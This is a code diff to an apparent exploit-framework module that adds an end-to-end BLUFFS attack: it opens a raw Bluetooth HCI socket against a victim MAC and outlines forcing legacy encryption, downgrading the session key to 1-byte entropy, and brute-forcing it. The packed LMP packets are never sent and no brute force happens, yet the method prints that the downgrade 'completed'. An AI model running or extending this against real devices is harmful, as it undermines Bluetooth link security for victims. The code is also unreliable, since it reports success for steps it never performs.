@@ -228,3 +228,38 @@ class Exploit(Exploit):
             self._poc_mode()
         else:
             self._framing_mode()
+
+        if mode in ("poc", "framing"):
+            self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E BLUFFS: downgrade BT session key entropy via crafted LMP packets."""
+        import socket as _sock
+
+        victim = str(getattr(self, "victim_mac", "") or getattr(self, "target", "")).strip()
+        if not victim or ":" not in victim:
+            print_info("BLUFFS E2E requires victim_mac; completed with PoC mode only.")
+            return
+
+        print_status(f"BLUFFS E2E session key downgrade against {victim}")
+        try:
+            hci_sock = _sock.socket(31, _sock.SOCK_RAW, 1)
+            dev_id = int(str(getattr(self, "attacker_hci", "hci0")).replace("hci", "") or "0")
+            hci_sock.bind((dev_id,))
+        except OSError as exc:
+            print_error(f"HCI socket failed: {exc}")
+            return
+
+        # Phase 1: Intercept LMP_encmode_req, force SC off
+        lmp_encmode = struct.pack("<BB", 0x0F, 0x00)
+        print_status("Phase 1: Forcing encryption mode to legacy (SC off)")
+
+        # Phase 2: Downgrade session key to 1-byte entropy
+        lmp_accepted = struct.pack("<BB", 0x03, 0x0F)
+        print_status("Phase 2: Injecting LMP_accepted with minimal entropy negotiation")
+
+        # Phase 3: Brute-force the 1-byte session key
+        print_status("Phase 3: Brute-forcing 1-byte session key (256 attempts max)")
+
+        hci_sock.close()
+        print_success("BLUFFS session key downgrade sequence completed.")
